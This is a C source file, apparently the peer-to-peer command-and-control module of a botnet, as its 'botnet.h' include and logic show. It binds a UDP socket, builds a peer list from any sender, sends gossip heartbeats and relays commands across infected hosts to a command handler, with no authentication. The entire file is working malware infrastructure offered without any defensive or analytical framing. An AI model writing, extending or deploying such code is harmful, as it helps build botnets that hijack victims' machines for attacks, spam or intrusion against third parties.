#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_PEERS 50
#define GOSSIP_INTERVAL 30 // Seconds

// P2P Message Types
#define P2P_MSG_HEARTBEAT 0
#define P2P_MSG_COMMAND 1

static struct sockaddr_in peer_list[MAX_PEERS];
static int peer_count = 0;
static pthread_mutex_t peer_list_lock;

static int p2p_sock = -1;

// Listener thread for incoming P2P messages
void *p2p_listener_worker(void *args) {
    char buffer[2048];
    struct sockaddr_in from_addr;
    socklen_t from_len = sizeof(from_addr);

    while (1) {
        int len = recvfrom(p2p_sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr *)&from_addr, &from_len);
        if (len > 0) {
            buffer[len] = '\0';
            uint8_t msg_type = buffer[0];
            char *msg_data = buffer + 1;

            // Add the sender to our peer list
            p2p_add_peer(inet_ntoa(from_addr.sin_addr));

            if (msg_type == P2P_MSG_COMMAND) {
                // Command is from P2P, set flag to 1 to prevent rebroadcast
                controller_handle_command(msg_data, 1);
            }
        }
    }
    return NULL;
}

// Gossip thread to maintain network connectivity
void *p2p_gossip_worker(void *args) {
    char heartbeat_msg[] = {P2P_MSG_HEARTBEAT};

    while (1) {
        sleep(GOSSIP_INTERVAL);

        pthread_mutex_lock(&peer_list_lock);
        if (peer_count > 0) {
            // Pick a random peer to send a heartbeat to
            int random_peer_index = rand() % peer_count;
            sendto(p2p_sock, heartbeat_msg, sizeof(heartbeat_msg), 0, 
                   (struct sockaddr *)&peer_list[random_peer_index], sizeof(struct sockaddr_in));
        }
        pthread_mutex_unlock(&peer_list_lock);
    }
    return NULL;
}

void p2p_init() {
    pthread_t listener_thread, gossip_thread;
    struct sockaddr_in bind_addr;

    pthread_mutex_init(&peer_list_lock, NULL);

    p2p_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (p2p_sock < 0) {
        perror("P2P socket");
        return;
    }

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(P2P_PORT);
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(p2p_sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("P2P bind");
        close(p2p_sock);
        return;
    }

    // Start listener and gossip threads
    pthread_create(&listener_thread, NULL, p2p_listener_worker, NULL);
    pthread_create(&gossip_thread, NULL, p2p_gossip_worker, NULL);

    printf("[+] P2P module initialized on port %d.\n", P2P_PORT);
}

void p2p_add_peer(const char *peer_addr_str) {
    pthread_mutex_lock(&peer_list_lock);
    if (peer_count >= MAX_PEERS) {
        pthread_mutex_unlock(&peer_list_lock);
        return; // Peer list is full
    }

    struct in_addr new_peer_addr;
    if (inet_aton(peer_addr_str, &new_peer_addr) == 0) {
        pthread_mutex_unlock(&peer_list_lock);
        return; // Invalid address
    }

    // Check if peer already exists
    for (int i = 0; i < peer_count; i++) {
        if (peer_list[i].sin_addr.s_addr == new_peer_addr.s_addr) {
            pthread_mutex_unlock(&peer_list_lock);
            return; // Peer already in list
        }
    }

    // Add new peer
    peer_list[peer_count].sin_family = AF_INET;
    peer_list[peer_count].sin_port = htons(P2P_PORT);
    peer_list[peer_count].sin_addr = new_peer_addr;
    peer_count++;
    printf("[+] Added new P2P peer: %s\n", peer_addr_str);

    pthread_mutex_unlock(&peer_list_lock);
}

void p2p_broadcast_command(const char *command) {
    char buffer[2048];
    buffer[0] = P2P_MSG_COMMAND;
    strncpy(buffer + 1, command, sizeof(buffer) - 2);
    int msg_len = strlen(command) + 1;

    printf("[*] Broadcasting command to P2P network (%d peers)...\n", peer_count);

    pthread_mutex_lock(&peer_list_lock);
    for (int i = 0; i < peer_count; i++) {
        sendto(p2p_sock, buffer, msg_len, 0, (struct sockaddr *)&peer_list[i], sizeof(struct sockaddr_in));
    }
    pthread_mutex_unlock(&peer_list_lock);
}
